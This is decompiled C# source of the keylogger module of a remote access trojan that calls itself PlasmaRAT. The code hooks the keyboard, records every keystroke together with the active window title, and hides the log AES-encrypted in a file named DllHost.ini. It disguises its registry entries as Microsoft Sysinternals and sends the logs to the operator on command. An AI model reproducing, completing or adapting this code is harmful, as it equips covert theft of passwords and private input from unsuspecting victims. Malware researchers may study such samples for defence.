using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x0200000D RID: 13
	[StandardModule]
	internal sealed class Logger
	{
		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000037 RID: 55 RVA: 0x000023D5 File Offset: 0x000005D5
		// (set) Token: 0x06000038 RID: 56 RVA: 0x00004218 File Offset: 0x00002418
		public static KeyboardHook kHook
		{
			get
			{
				return Logger._kHook;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyboardHook.KeyDownEventHandler value2 = new KeyboardHook.KeyDownEventHandler(Logger.kHook_KeyDown);
				if (Logger._kHook != null)
				{
					KeyboardHook.KeyDown -= value2;
				}
				Logger._kHook = value;
				if (Logger._kHook != null)
				{
					KeyboardHook.KeyDown += value2;
				}
			}
		} = new KeyboardHook();

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetForegroundWindow();

		// Token: 0x0600003A RID: 58
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

		// Token: 0x0600003B RID: 59 RVA: 0x00004254 File Offset: 0x00002454
		public static void StartLogger()
		{
			try
			{
				string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "PROCID", "");
				if (Operators.CompareString(setting, string.Empty, false) == 0)
				{
					Random random = new Random();
					Interaction.SaveSetting("Microsoft", "Sysinternals", "PROCID", random.Next(1000, 9999).ToString());
				}
				Logger.KeyLogFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DllHost.ini";
				if (!File.Exists(Logger.KeyLogFile))
				{
					File.WriteAllText(Logger.KeyLogFile, string.Empty);
				}
				Persistence.AllowAccess(Logger.KeyLogFile);
				Logger.kHook.Register();
				Thread thread = new Thread(new ThreadStart(Logger.GetWindow));
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				Thread thread2 = new Thread(new ThreadStart(Logger.SaveLogs));
				thread2.SetApartmentState(ApartmentState.STA);
				thread2.Start();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004360 File Offset: 0x00002560
		public static void SendLogs()
		{
			try
			{
				string text = PlasmaRAT.AES_Decrypt(File.ReadAllText(Logger.KeyLogFile));
				string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "PROCID", "");
				PlasmaRAT.Send(string.Concat(new string[]
				{
					"KEYLOGS*",
					Environment.UserName.ToString(),
					".",
					setting,
					"*",
					text,
					"\r\n",
					Logger.KeyLogs
				}));
				PlasmaRAT.TalktoChannel("Uploaded Keylogs Successfully!", string.Empty);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004434 File Offset: 0x00002634
		public static void DeleteLogs()
		{
			try
			{
				if (File.Exists(Logger.KeyLogFile))
				{
					File.WriteAllText(Logger.KeyLogFile, string.Empty);
				}
				PlasmaRAT.TalktoChannel("Keylogs deleted Successfully!", string.Empty);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x0000448C File Offset: 0x0000268C
		public static void SearchLogs(string query)
		{
			try
			{
				string text = PlasmaRAT.AES_Decrypt(File.ReadAllText(Logger.KeyLogFile));
				if (text.Contains(query))
				{
					string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "PROCID", "");
					PlasmaRAT.Send(string.Concat(new string[]
					{
						"KEYLOGS*",
						Environment.UserName.ToString(),
						".",
						setting,
						"*",
						text,
						"\r\n",
						Logger.KeyLogs
					}));
					PlasmaRAT.TalktoChannel("Found Query in Keylogs, Uploaded Successfully!", string.Empty);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000456C File Offset: 0x0000276C
		public static void SaveLogs()
		{
			for (;;)
			{
				try
				{
					if (Logger.KeyLogs.Length > 150)
					{
						Persistence.AllowAccess(Logger.KeyLogFile);
						string str = PlasmaRAT.AES_Decrypt(File.ReadAllText(Logger.KeyLogFile));
						File.WriteAllText(Logger.KeyLogFile, PlasmaRAT.AES_Encrypt(str + Logger.KeyLogs));
						Logger.KeyLogs = string.Empty;
					}
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000045F4 File Offset: 0x000027F4
		public static void GetWindow()
		{
			for (;;)
			{
				try
				{
					Thread.Sleep(300);
					string activeWindowTitle = Logger.GetActiveWindowTitle();
					if (Operators.CompareString(Logger.LastWindowStr, activeWindowTitle, false) != 0 && Operators.CompareString(activeWindowTitle, string.Empty, false) != 0)
					{
						Logger.LastWindowStr = Logger.GetActiveWindowTitle();
						Logger.KeyLogs = Logger.KeyLogs + "\r\n\r\n[" + Logger.LastWindowStr + "]\r\n";
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004678 File Offset: 0x00002878
		private static string GetActiveWindowTitle()
		{
			string result;
			try
			{
				string text = new string('\0', 255);
				Logger.GetWindowTextA(Logger.GetForegroundWindow(), ref text, 255);
				text = text.Substring(0, Strings.InStr(text, "\0", CompareMethod.Binary) - 1);
				if (Operators.CompareString(text.Trim(new char[]
				{
					'\0'
				}).Trim(), null, false) == 0)
				{
					result = null;
				}
				else
				{
					result = text.Trim(new char[]
					{
						'\0'
					}).Trim();
				}
			}
			catch (Exception ex)
			{
				result = "N/A";
			}
			return result;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004720 File Offset: 0x00002920
		private static void kHook_KeyDown(Keys e)
		{
			if (e >= Keys.A && e <= Keys.Z)
			{
				if (Control.IsKeyLocked(Keys.Capital))
				{
					Logger.KeyLogs += e.ToString();
				}
				else if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
				{
					Logger.KeyLogs += e.ToString();
				}
				else
				{
					string text = e.ToString();
					Logger.KeyLogs += text.ToLower();
				}
			}
			else if (e >= Keys.D0 && e <= Keys.D9)
			{
				if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
				{
					string text2 = e.ToString();
					text2 = text2.Replace("D1", "!");
					text2 = text2.Replace("D2", "@");
					text2 = text2.Replace("D3", "#");
					text2 = text2.Replace("D4", "$");
					text2 = text2.Replace("D5", "%");
					text2 = text2.Replace("D6", "^");
					text2 = text2.Replace("D7", "&");
					text2 = text2.Replace("D8", "*");
					text2 = text2.Replace("D9", "(");
					text2 = text2.Replace("D0", ")");
					Logger.KeyLogs += text2;
				}
				else
				{
					string text3 = e.ToString();
					text3 = text3.Replace("D", "");
					Logger.KeyLogs += text3;
				}
			}
			else if (e >= Keys.NumPad0 && e <= Keys.NumPad9)
			{
				string text4 = e.ToString();
				text4 = text4.Replace("NumPad", "");
				Logger.KeyLogs += text4;
			}
			else if (e >= Keys.Multiply && e <= Keys.Divide)
			{
				string text5 = e.ToString();
				text5 = text5.Replace("Divide", "/");
				text5 = text5.Replace("Multiply", "*");
				text5 = text5.Replace("Subtract", "-");
				text5 = text5.Replace("Add", "+");
				text5 = text5.Replace("Decimal", ".");
				Logger.KeyLogs += text5;
			}
			else if (e == Keys.Space)
			{
				Logger.KeyLogs += " ";
			}
			else if (e >= Keys.OemSemicolon && e <= Keys.OemQuotes)
			{
				if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
				{
					string text6 = e.ToString();
					text6 = text6.Replace("OemMinus", "_");
					text6 = text6.Replace("Oemplus", "+");
					text6 = text6.Replace("OemOpenBrackets", "{");
					text6 = text6.Replace("Oem6", "}");
					text6 = text6.Replace("Oem5", "|");
					text6 = text6.Replace("Oem1", ":");
					text6 = text6.Replace("Oemcomma", "<");
					text6 = text6.Replace("OemPeriod", ">");
					text6 = text6.Replace("OemQuestion", "?");
					text6 = text6.Replace("Oemtilde", "~");
					Logger.KeyLogs += text6;
				}
				else
				{
					string text7 = e.ToString();
					text7 = text7.Replace("OemMinus", "-");
					text7 = text7.Replace("Oemplus", "=");
					text7 = text7.Replace("OemOpenBrackets", "[");
					text7 = text7.Replace("Oem6", "]");
					text7 = text7.Replace("Oem5", "\\");
					text7 = text7.Replace("Oem1", ";");
					text7 = text7.Replace("Oem7", "\"");
					text7 = text7.Replace("Oemcomma", ",");
					text7 = text7.Replace("OemPeriod", ".");
					text7 = text7.Replace("OemQuestion", "/");
					text7 = text7.Replace("Oemtilde", "`");
					Logger.KeyLogs += text7;
				}
			}
			else
			{
				string text8 = "<Up><Right><Down><Left><LControlKey><RControlKey><NumLock><PageUp><Next><Home><End><Insert><Delete><Escape><LShiftKey><LWin><LMenu><Apps><RShiftKey><RMenu>";
				string text9 = e.ToString();
				if (!text8.Contains(text9))
				{
					if (text9.Contains("Oem7"))
					{
						text9 = text9.Replace("Oem7", "\"");
					}
					if (text9.Contains("Back"))
					{
						Logger.KeyLogs = Logger.KeyLogs.Substring(0, Logger.KeyLogs.Length - 1);
					}
					else if (text9.Contains("Tab"))
					{
						Logger.KeyLogs += "\t";
					}
					else if (text9.Contains("Return"))
					{
						Logger.KeyLogs += "\r\n";
					}
				}
			}
		}

		// Token: 0x04000046 RID: 70
		[AccessedThroughProperty("kHook")]
		private static KeyboardHook _kHook;

		// Token: 0x04000047 RID: 71
		private static string LastWindowStr = null;

		// Token: 0x04000048 RID: 72
		public static string KeyLogs = string.Empty;

		// Token: 0x04000049 RID: 73
		public static string KeyLogFile = string.Empty;
	}
}
